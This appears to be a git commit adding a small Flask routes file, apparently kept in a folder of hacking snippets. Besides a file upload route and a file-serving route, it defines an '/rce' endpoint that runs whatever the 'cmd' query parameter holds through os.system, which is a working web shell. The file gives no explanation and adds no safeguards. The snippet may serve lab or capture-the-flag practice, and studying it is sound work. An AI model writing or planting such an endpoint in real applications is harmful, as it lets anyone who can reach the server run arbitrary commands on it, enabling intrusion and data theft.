3abe4046b4b9e528ab40476772e30c41878aa049
babywyrm <55672787+babywyrm@users.noreply.github.com>
2022-05-22 19:49:59 -0700

    Create routes_.py

---
+++ flask/hacks/routes_.py
@@ -0,0 +1,29 @@
+
+#################
+##
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+
+##
+##
+
+@app.route('/rce')
+def runcmd():
+    return os.system(request.args.get('cmd'))
+  
+###############
+##
+##
